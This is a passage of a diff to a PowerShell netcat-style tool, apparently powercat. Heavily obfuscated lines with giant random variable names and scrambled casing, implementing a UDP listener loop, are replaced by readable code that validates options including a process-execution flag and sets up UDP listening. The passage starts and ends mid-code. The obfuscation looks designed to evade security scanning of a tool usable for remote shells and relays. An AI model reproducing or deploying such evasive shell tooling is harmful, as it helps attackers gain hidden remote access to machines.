$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.BeginReceiveMessageFrom($H17WO98ku2z9KWWKBNCzd0qfp3KatUC35DhkhFMNsSZkg5KIJeFfTOzdQUVbqbjib7bwn3TQjZ6LGTONswGoDZLJKWPyF6YZMIeWRWYjwNcApuDEJAIdYZbb0wS3lvPAVXrz5dQS0tx0TBO01OyOpBA0MJu11IFKqqGk5LW8Pg5zc890Wq4fovuWwVT1BKpCee1E8OEWe0czsn82MzhlBNXvm61IXyNlUSbRQItcoCsk8h7EWyZBoZpX63Lbovd388jD9BmB0gOACciQxaABAKfcUJFq7uFGHjLadpKVB4NxWYG5ycBF7WfHNBcc2Rnnh4IDWFcdarnbi1iuxwKsUYiZVjtBbEXk1Fzc9Ln7JG0dTAfdMU6rFZygriQknOPB2NveWmgnoattS4XrH5EJ8umZeHFQ8JhfsrOe4oXJGcKpvFC6wza0wTCKl1rxRpfgwp5xECzxao67vtja8C5azfk,0,65536,[SYSteM.NET.SOckeTs.sockETFLAgs]::None,[ref]$tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg,$NUll,$NUll)
-      $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs = [SysTEM.DIAGNOsTics.stOPwAtcH]::StartNew()
-      while($tRue)
-{
-      if($DeAjpfP1s5Zyzh8D4CaEcy0QukgMn3xfMmgSqayJRTcbGU9owS6k1uccSfLyV8uNENTh81oWvhNsUNv2Dlj0y3lnkGEv4BX3UNlbPEfBRNBcxhm7ab68ZMUBTY3KTx0sR3xq2ANsjryRZpsxVf7cO3J4E8DJX9G3RPvCOYLVGZ5raF7md8gwqjiQKKe56IgmnP47M3H9jPdZFUBOTL6CtiGSkAyQwKASfUXBRkiwhrod2kzzXIawHkFxD095DXb7GcFKt4PIDoqdFjYtRhGfwr1v2gnfgXjebmxInovjyA7nlecbrHE5njLwExkQZbAs3WQqGKFncM5NTE5xeY4PyHCiuxMQdR7inZsZQrp5BEdVaeRV03DdLAxjQ8M8Os.UI.RawUI.KeyAvailable)
-         {
-        if(@(17,27) -contains ($DeAjpfP1s5Zyzh8D4CaEcy0QukgMn3xfMmgSqayJRTcbGU9owS6k1uccSfLyV8uNENTh81oWvhNsUNv2Dlj0y3lnkGEv4BX3UNlbPEfBRNBcxhm7ab68ZMUBTY3KTx0sR3xq2ANsjryRZpsxVf7cO3J4E8DJX9G3RPvCOYLVGZ5raF7md8gwqjiQKKe56IgmnP47M3H9jPdZFUBOTL6CtiGSkAyQwKASfUXBRkiwhrod2kzzXIawHkFxD095DXb7GcFKt4PIDoqdFjYtRhGfwr1v2gnfgXjebmxInovjyA7nlecbrHE5njLwExkQZbAs3WQqGKFncM5NTE5xeY4PyHCiuxMQdR7inZsZQrp5BEdVaeRV03DdLAxjQ8M8Os.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
-   {
-       $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Close()
-$p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
-       break
-         }
-       }
-        if($p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Elapsed.TotalSeconds -gt $t)
-       {
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Close()
- $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
- Write-Verbose "Timeout!" ; break
+  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
+  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
+  if($l)
+  {
+    $Failure = $False
+    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
+    if($Failure){break}
+  }
+  if($r -ne "")
+  {
+    if($r.split(":").Count -eq 2)
+    {
+      $Failure = $False
+      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
+      if($Failure){break}
     }
- if($xJ9oetg13pqvYIeAvPpEmQZjMNlVda9pbbJ5sPw64UK717Ag6okDFwlO6Gq9Wajb98U3WXC1HZLPz2i9FyIruwYR1tGfnMzqqthLtjFDOOeQCbs5YZ92rMaPa7ZloKgsP2SIMCQTK3qzEASjZqIfnZYN45GFdT9zIKElCUlpiJqMvA3kr19ZpI1thiVNUBVLK7HscueqwXgSE5yQhFH4w8ettx4m2M0KNI31XZs5nLvCCUVvwakG1SSrBoEn5ongeEsRsPt6CA7JPkX3oolhWWlinroZlCPyhtnNbTLgLuEvtPU25OzZ9G9NjgzXKRK0cYRrt7VmVXMCUG2Y9nzMrS1tF25wesH2amUvDnBVLl5UkT6Ojvi5cfxgph4f73gbYHTVPL3PRaJh8ZISFkoVGhK4QV5CTIhLcR1EU5MdjPcyg9DRH6XU8sFwumU1oFRpnUaWhdpL3SP3NYoIgo5MxF1WHTfZ4Zrj36zRrQ4ZmEuylNajGDVvA3PfSaKO28ubSImNrfS9MPIrHyH0KbJb315aoLq2MffFt1GHOx9wmuLrZW0mpUlhupLDijHUUp3zYXmKwBZDCaeLKGxt2vBfPeolx3oCUPvLHJRerw8jC8iaAl6XicKIIUhebNBKXs3R1GAIP7M4Wft3WsZ7UF8zP4omnSzFLApNoAZerbpvFEYRvW5pr8j1s8BCAb9NDsk2h4t2H098PKept7eWZ9JfcixTBg61W9MKUVdp4Lp6swdl7ND2fKwMdu8uZ6lKM0CtxwhRbArUzuftcM1vrQ4nZEKbG5A189QquA0MTfZdT0jQlnRqbIKsQq4P0EHZDHo6y3n6p6mhx8tU9Xy1r4HnkqPTvQ0y3T44jlCKEEnRmHTN8irDbAfHMjH2Di2UGw79XH.IsCompleted)
-{
-        $eQtj3c1tItq7v1xXUWiVlWOCxox9P41QRwgUpAt0D2XgaUaOrghEkEBeWdVZlH4i61ZeU0fKmFezbvyg6kW938EKHgKiwk3T0NufU2PQgmyY8M4l3fX06yIqK7AwN8YUC0WnYQIAzj8iElRt2xtPY9fXMoJfSfIDwu8EjsYZcgH7rregcZRotBfP8Xx13v5su7TvS75zR5FBwrrpJC0Dfz6slrHuJ8wN3nkculddvVvPDMjrqAxTYSReIDKYcAR0bn8nGOhe7u8FUXHGVl1h7G4WF9spIAP8put4JAPmKN2WUWjMXZYetZw5IJQUnTZSv4XS0JNZFoAO8T9VKV2CHCWB9gneYrGHtQtVsdTz3QeM3wpDJFF3kpiV7iNxSPohUzJHS1Jaux94Gb0Hx03x00LCfSBo1PMQ4TgkH64oWRXbrlVM4s3pddHm66LaY0gpQal7gB0vwxV7ghup4c628I2QAYqrAeNauyQ9mAS9MTvGCpNPibG6n70Nbcf1xKk0lNC0TlKXI1sJaWGz01Oxo41m7abHf1AAfPjHTFWvOHKTHKX3JVLbi4dGksCny8zvQKHJY0X06sTWbSfGYoPnRy6KKTWDLPc4uZMQK8SnlVjrlPTa682LVkOJfSV5izZMmk5W6Ja2SFL9RmpAF85EyPNbL73y83N87h6XaVomDSGr8OjBRWuKgboHBVE8XicOJ5FK8hiDvtrEr5uKnLHY2jtvEj4PtDeEl6U3TJxoe7x8DX9N9jhQ7L9VYnJMCR3LazME80wWYpknXHphOqdHRuOWXDcik7Ts4iyM0YdvKmEIfhqOpzjt29owQ3mVUKrDlQmWPcp7R1voRsa70d7Fo02I1cei9wizVi8xnRVVxQ5mqdwOYCznOubIeZPdqElR1MRsmmh6c3vXrwRzyPiDZiICDw7Yt = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.EndReceiveMessageFrom($xJ9oetg13pqvYIeAvPpEmQZjMNlVda9pbbJ5sPw64UK717Ag6okDFwlO6Gq9Wajb98U3WXC1HZLPz2i9FyIruwYR1tGfnMzqqthLtjFDOOeQCbs5YZ92rMaPa7ZloKgsP2SIMCQTK3qzEASjZqIfnZYN45GFdT9zIKElCUlpiJqMvA3kr19ZpI1thiVNUBVLK7HscueqwXgSE5yQhFH4w8ettx4m2M0KNI31XZs5nLvCCUVvwakG1SSrBoEn5ongeEsRsPt6CA7JPkX3oolhWWlinroZlCPyhtnNbTLgLuEvtPU25OzZ9G9NjgzXKRK0cYRrt7VmVXMCUG2Y9nzMrS1tF25wesH2amUvDnBVLl5UkT6Ojvi5cfxgph4f73gbYHTVPL3PRaJh8ZISFkoVGhK4QV5CTIhLcR1EU5MdjPcyg9DRH6XU8sFwumU1oFRpnUaWhdpL3SP3NYoIgo5MxF1WHTfZ4Zrj36zRrQ4ZmEuylNajGDVvA3PfSaKO28ubSImNrfS9MPIrHyH0KbJb315aoLq2MffFt1GHOx9wmuLrZW0mpUlhupLDijHUUp3zYXmKwBZDCaeLKGxt2vBfPeolx3oCUPvLHJRerw8jC8iaAl6XicKIIUhebNBKXs3R1GAIP7M4Wft3WsZ7UF8zP4omnSzFLApNoAZerbpvFEYRvW5pr8j1s8BCAb9NDsk2h4t2H098PKept7eWZ9JfcixTBg61W9MKUVdp4Lp6swdl7ND2fKwMdu8uZ6lKM0CtxwhRbArUzuftcM1vrQ4nZEKbG5A189QquA0MTfZdT0jQlnRqbIKsQq4P0EHZDHo6y3n6p6mhx8tU9Xy1r4HnkqPTvQ0y3T44jlCKEEnRmHTN8irDbAfHMjH2Di2UGw79XH,[ref]([SYSteM.NET.SOckeTs.sockETFLAgs]::None),[ref]$tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg,[ref]$UZIDTBWfNNBVcJ42PL8u3PhY3ip0wWesqIQ2ScnRzvabv57vPsrkYuVhGxjGneOYVReVYMxOGKR0iNaZYtZKvCkNaDhOKfWUw3pA3k8tDbjsJBmBuMgxuInqjjZoStYBaMX36y8SnsCbGn24PC4oaEOHXXVHO0gFV9XcaRSIKMBJ7syFsLiR3UX9A87DXjimeYAyKRgMwuAnn11kBED3L8Kv9nfc7RMPxyj5TPTCbiihN8kRmxbRv30HJyrVHT55hdOiFyDY1MqW8sANslV5PXnlVlp2CgZ6zWW2VatdgMKbGfbduMljEa9POu5ouYNpds18YLvcovoz2UTexNuOoDHzGXmrgjWJhKLiyHJkVUBgkOiZm5cbrCgXHfZLwyeBEM8Q18xic0s99MwXuKuNa28B7PqAUgdiNtgmsQMfunlyCHU81EXZTfaLyvY10xoOCUzS1Np2YWcIigBIqNrv6OMfUch3GlVz3NbOpzeS0inVr6ZKf2tlZ8YtWWXavXBw085z22IQUvYUmclFlbGl6s9Qkz3xA6QfBBKCGdIZxBZ97Cw1W8UgQw74jRVeTbQcfqgZKxsGacXgWh5ejCt)
-       Write-Verbose ("Connection from [" + $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg.Port + ")")
-if($eQtj3c1tItq7v1xXUWiVlWOCxox9P41QRwgUpAt0D2XgaUaOrghEkEBeWdVZlH4i61ZeU0fKmFezbvyg6kW938EKHgKiwk3T0NufU2PQgmyY8M4l3fX06yIqK7AwN8YUC0WnYQIAzj8iElRt2xtPY9fXMoJfSfIDwu8EjsYZcgH7rregcZRotBfP8Xx13v5su7TvS75zR5FBwrrpJC0Dfz6slrHuJ8wN3nkculddvVvPDMjrqAxTYSReIDKYcAR0bn8nGOhe7u8FUXHGVl1h7G4WF9spIAP8put4JAPmKN2WUWjMXZYetZw5IJQUnTZSv4XS0JNZFoAO8T9VKV2CHCWB9gneYrGHtQtVsdTz3QeM3wpDJFF3kpiV7iNxSPohUzJHS1Jaux94Gb0Hx03x00LCfSBo1PMQ4TgkH64oWRXbrlVM4s3pddHm66LaY0gpQal7gB0vwxV7ghup4c628I2QAYqrAeNauyQ9mAS9MTvGCpNPibG6n70Nbcf1xKk0lNC0TlKXI1sJaWGz01Oxo41m7abHf1AAfPjHTFWvOHKTHKX3JVLbi4dGksCny8zvQKHJY0X06sTWbSfGYoPnRy6KKTWDLPc4uZMQK8SnlVjrlPTa682LVkOJfSV5izZMmk5W6Ja2SFL9RmpAF85EyPNbL73y83N87h6XaVomDSGr8OjBRWuKgboHBVE8XicOJ5FK8hiDvtrEr5uKnLHY2jtvEj4PtDeEl6U3TJxoe7x8DX9N9jhQ7L9VYnJMCR3LazME80wWYpknXHphOqdHRuOWXDcik7Ts4iyM0YdvKmEIfhqOpzjt29owQ3mVUKrDlQmWPcp7R1voRsa70d7Fo02I1cei9wizVi8xnRVVxQ5mqdwOYCznOubIeZPdqElR1MRsmmh6c3vXrwRzyPiDZiICDw7Yt -gt 0){break}
-    else{break}
-    }
-         }
-    $p2hqIuzHyLmfQvW08KBevbB6fB6bPXLLbUBdPY76K7VVJIghT9vs5riWZ0wY06MmcDWsU09ARmR98G0cyHjmzuJufApxiuadwDGLe1YKuV4fi4B2g7gwn1O7wUmX489Mz358Z0vQBuoZk8yR4yNt32a9ppTzrRn5MK6HIDfkilLqcykZx5cqmkxONUu3nBQJwJcmvGzY1MC1m8sf1gtqmnElIJvpv1RIOuYEKyRa0Vo33O53GBFRTdPsxyTiaFvIInCGXMbHBI7UCb3E22NCU34SJrRbXa5fRBaOUjQNno23F1aT7kmO4KhnavxZDdUG384j1LA37Mh1restTdxsd1a7CsLMDUxAi43tMJOpO12tSVZtwGzBUwtvuRh5kPfqHDXU0Dau4w4li7Gf5NjfuxH6Ak2jbHbSiIlIDKnLC4meJ5SsMSNgJ4P0HlVYWcDxqTOxKJj3S0bGAG1HJ1Ifwj6JZfavFyoYf27vKWTCi9dscgIfgIE7wKIma5W0hyJUJvTiz9OPK1jjX3hjXbgMQ72qTfvwanOWb5oki4YAtWBtzmtGV7jctkDevqayqNMbsoA8BICKrnpgPV1HEe6AjUacMdhlbG0vZEQk1P8r8EqaPlqhs3h6BIg2hgucVN5fDyKyxvz5hAe0xCKG9aj9culGTjx89xxQs.Stop()
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["InitialConnectionBytes"] = $H17WO98ku2z9KWWKBNCzd0qfp3KatUC35DhkhFMNsSZkg5KIJeFfTOzdQUVbqbjib7bwn3TQjZ6LGTONswGoDZLJKWPyF6YZMIeWRWYjwNcApuDEJAIdYZbb0wS3lvPAVXrz5dQS0tx0TBO01OyOpBA0MJu11IFKqqGk5LW8Pg5zc890Wq4fovuWwVT1BKpCee1E8OEWe0czsn82MzhlBNXvm61IXyNlUSbRQItcoCsk8h7EWyZBoZpX63Lbovd388jD9BmB0gOACciQxaABAKfcUJFq7uFGHjLadpKVB4NxWYG5ycBF7WfHNBcc2Rnnh4IDWFcdarnbi1iuxwKsUYiZVjtBbEXk1Fzc9Ln7JG0dTAfdMU6rFZygriQknOPB2NveWmgnoattS4XrH5EJ8umZeHFQ8JhfsrOe4oXJGcKpvFC6wza0wTCKl1rxRpfgwp5xECzxao67vtja8C5azfk[0..([int]$eQtj3c1tItq7v1xXUWiVlWOCxox9P41QRwgUpAt0D2XgaUaOrghEkEBeWdVZlH4i61ZeU0fKmFezbvyg6kW938EKHgKiwk3T0NufU2PQgmyY8M4l3fX06yIqK7AwN8YUC0WnYQIAzj8iElRt2xtPY9fXMoJfSfIDwu8EjsYZcgH7rregcZRotBfP8Xx13v5su7TvS75zR5FBwrrpJC0Dfz6slrHuJ8wN3nkculddvVvPDMjrqAxTYSReIDKYcAR0bn8nGOhe7u8FUXHGVl1h7G4WF9spIAP8put4JAPmKN2WUWjMXZYetZw5IJQUnTZSv4XS0JNZFoAO8T9VKV2CHCWB9gneYrGHtQtVsdTz3QeM3wpDJFF3kpiV7iNxSPohUzJHS1Jaux94Gb0Hx03x00LCfSBo1PMQ4TgkH64oWRXbrlVM4s3pddHm66LaY0gpQal7gB0vwxV7ghup4c628I2QAYqrAeNauyQ9mAS9MTvGCpNPibG6n70Nbcf1xKk0lNC0TlKXI1sJaWGz01Oxo41m7abHf1AAfPjHTFWvOHKTHKX3JVLbi4dGksCny8zvQKHJY0X06sTWbSfGYoPnRy6KKTWDLPc4uZMQK8SnlVjrlPTa682LVkOJfSV5izZMmk5W6Ja2SFL9RmpAF85EyPNbL73y83N87h6XaVomDSGr8OjBRWuKgboHBVE8XicOJ5FK8hiDvtrEr5uKnLHY2jtvEj4PtDeEl6U3TJxoe7x8DX9N9jhQ7L9VYnJMCR3LazME80wWYpknXHphOqdHRuOWXDcik7Ts4iyM0YdvKmEIfhqOpzjt29owQ3mVUKrDlQmWPcp7R1voRsa70d7Fo02I1cei9wizVi8xnRVVxQ5mqdwOYCznOubIeZPdqElR1MRsmmh6c3vXrwRzyPiDZiICDw7Yt-1)]
+  }
+  ############### VALIDATE ARGS ###############
+  
+  ############### UDP FUNCTIONS ###############
+  function Setup_UDP
+  {
+    param($FuncSetupVars)
+    if($global:Verbose){$Verbose = $True}
+    $c,$l,$p,$t = $FuncSetupVars
+    $FuncVars = @{}
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    if($l)
+    {
+      $SocketDestinationBuffer = New-Object System.Byte[] 65536
+      $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
+      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
+      $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
+      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
+      $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
+      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+      while($True)
+      {
+        if($Host.UI.RawUI.KeyAvailable)
+        {
+          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
+          {
+            Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
+            $FuncVars["Socket"].Close()
+            $Stopwatch.Stop()
+            break
+          }
         }
-  else
- {
-      if(!$C.Contains("."))
-         {
